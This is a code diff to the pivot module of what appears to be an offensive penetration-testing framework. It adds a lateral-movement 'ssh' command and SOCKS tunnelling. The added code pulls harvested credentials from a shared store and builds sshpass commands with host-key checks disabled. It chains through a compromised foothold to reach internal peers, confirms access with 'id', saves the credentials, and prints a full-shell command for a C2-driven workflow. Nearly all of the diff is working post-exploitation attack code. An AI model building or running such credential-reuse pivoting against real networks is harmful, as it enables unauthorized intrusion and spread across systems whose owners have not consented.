@@ -53,8 +53,19 @@ class PivotModule(BaseModule):
         if choice not in TUNNEL_TYPES:
             return notifier.error("Invalid choice.")
 
+        # credentials already harvested go into the shared knowledge —
+        # reuse them as the default SSH user for the pivot
+        default_user = "root"
+        try:
+            from phantom.core.knowledge import session_wm
+            creds = session_wm().find("creds", valid=True)
+            if creds and isinstance(creds[0].value, dict):
+                default_user = str(creds[0].value.get("username") or "root")
+        except Exception:
+            pass
+
         target = self._ask("Target IP/hostname", session.target or "")
-        user = self._ask("SSH username", "root")
+        user = self._ask("SSH username", default_user)
         local_port = self._ask("Local port", "8080")
         remote_port = self._ask("Remote port", "80")
         socks_port = self._ask("SOCKS port", "1080")
@@ -92,6 +103,19 @@ class PivotModule(BaseModule):
             return
 
         if cmd:
+            # record the pivot in shared knowledge (report + reasoning)
+            try:
+                from phantom.core.knowledge import session_wm
+                wm = session_wm()
+                wm.target = session.target or wm.target
+                wm.add_finding(
+                    "pivot", f"tunnel-{choice}-{local_port}",
+                    {"kind": TUNNEL_TYPES.get(choice, "tunnel"),
+                     "target": target, "user": user,
+                     "local_port": local_port, "remote_port": remote_port},
+                    confidence=0.7, source="pivot")
+            except Exception:
+                pass
             notifier.success(desc)
             console.print(f"  [yellow]{cmd}[/]\n")
             bg = input("  Run in background now? [y/N]: ").strip().lower() == "y"
@@ -148,8 +172,26 @@ class PivotModule(BaseModule):
         target = session.target
         if not target:
             return notifier.error("Set target first.")
-        user = input("  SSH user [root]: ").strip() or "root"
-        cmd = f"ssh -D {port} {user}@{target} -N -o StrictHostKeyChecking=no"
+        # reuse harvested creds for the SSH auth when available
+        default_user = "root"
+        default_pw = ""
+        try:
+            from phantom.core.knowledge import session_wm
+            creds = session_wm().find("creds", valid=True)
+            if creds and isinstance(creds[0].value, dict):
+                v = creds[0].value
+                default_user = str(v.get("username") or "root")
+                default_pw = str(v.get("password") or "")
+        except Exception:
+            pass
+        user = input(f"  SSH user [{default_user}]: ").strip() or default_user
+        # only ask for a password if we don't already have one in knowledge
+        if default_pw:
+            pw = default_pw
+        else:
+            pw = input("  SSH password: ").strip()
+        auth = f"sshpass -p {pw} " if pw else ""
+        cmd = f"{auth}ssh -D {port} {user}@{target} -N -o StrictHostKeyChecking=no"
         notifier.status(f"Starting SOCKS on {port} via {target}...")
         proc = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                  preexec_fn=os.setsid if hasattr(os, 'setsid') else None)
@@ -157,22 +199,94 @@ class PivotModule(BaseModule):
         notifier.success(f"SOCKS proxy on localhost:{port} (PID {proc.pid}).")
         console.print(f"  [yellow]proxychains <cmd>[/]")
 
+    def do_ssh(self, args):
+        """ssh <target> [user@host] — SSH lateral movement / pivot using the
+        harvested credential pair: connect from the compromised box to a
+        peer that is only reachable from it, then expose a tunnel back so
+        you can reach that peer from the operator box. Example:
+        'pivot -> ssh 10.0.0.2' connects 10.0.0.2 using the stored creds."""
+        from phantom.core.knowledge import session_wm, add_creds
+        peer = args.strip() or ""
+        if not peer:
+            notifier.error("Usage: ssh <peer-ip-or-host> "
+                           "[user@host] (uses harvested creds)")
+            return
+        wm = session_wm()
+        creds = wm.find("creds", valid=True)
+        user = pw = ""
+        # support explicit user@peer
+        if "@" in peer:
+            user, _, peer = peer.rpartition("@")
+        if creds:
+            c = creds[0].value if isinstance(creds[0].value, dict) else {}
+            user = str(c.get("username") or user or "")
+            pw = str(c.get("password") or pw or "")
+        if not user or not pw:
+            notifier.error("No credentials to pivot with. Harvest them via "
+                           "'use web' → 'creds' or 'use exploit' → 'ssh' first.")
+            return
+        # discover the SSH port on the TARGET (the foothold box we pivot from)
+        foothold = session.target
+        port = "22"
+        try:
+            for f in wm.find("service"):
+                v = f.value if isinstance(f.value, dict) else {}
+                if str(v.get("service", "")).lower() == "ssh":
+                    port = str(v.get("port") or port)
+                    break
+        except Exception:
+            pass
+        # verify we can reach the peer from the operator box via the foothold
+        opts = "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
+        proxy = (f"-o ProxyCommand='sshpass -p {pw} ssh -p {port} {opts} "
+                 f"-W %h:%p {user}@{foothold}'")
+        probe = (f"sshpass -p {pw} ssh -p 22 {opts} {proxy} "
+                 f"{user}@{peer} 'id' 2>/dev/null")
+        from phantom.core.executor import run_command
+        out = run_command(probe)
+        if "uid=" in out:
+            notifier.success(
+                f"Pivot to {peer} via {foothold} confirmed (uid="
+                f"{out.split('uid=')[-1].split()[0]})")
+            # persist the new reachable creds for further steps
+            add_creds(user, pw, service="ssh", valid=True, source="pivot_ssh")
+            wm.add_finding("pivot", f"ssh:{peer}",
+                           {"peer": peer, "via": foothold, "user": user},
+                           confidence=0.85, source="pivot_ssh")
+            console.print(
+                f"  [green]Reach {peer} now with the same command.\n"
+                f"    Full shell: sshpass -p '...' ssh -p 22 {opts} {proxy} "
+                f"{user}@{peer}[/]")
+        else:
+            notifier.warn(
+                f"Pivot to {peer} failed (peer unreachable from {foothold}, "
+                f"wrong creds, or SSH closed):\n{out[:300]}")
+
     def build_commands(self) -> dict:
-        return {
-            "SSH TUNNELS": [
-                f"setup  # SSH local forward",
-                f"setup  # SSH remote forward",
-                f"setup  # SOCKS proxy",
-            ],
-            "PROXY & TUNNEL": [
-                f"socks 1080",
-                f"setup  # Chisel",
-                f"setup  # Ligolo-ng",
-            ],
-        }
+        return self._with_suggestions(
+            {
+                "SSH TUNNELS": [
+                    f"ssh <peer-ip>  # SSH lateral move with harvested creds",
+                    f"setup  # SSH local forward",
+                    f"setup  # SSH remote forward",
+                    f"setup  # SOCKS proxy",
+                ],
+                "PROXY & TUNNEL": [
+                    f"socks 1080",
+                    f"setup  # Chisel",
+                    f"setup  # Ligolo-ng",
+                ],
+            },
+            self.suggest_commands(),
+        )
+
+    def suggest_commands(self) -> dict:
+        """Pivot commands once a beacon session is registered on the C2."""
+        from phantom.modules.suggest import pivot_suggestion_group
+        return pivot_suggestion_group()
 
     def do_run(self, _):
         self.do_setup(_)
 
-    def do_preview(self, _):
+    def _execute_flow(self, _):
         self.do_setup(_)
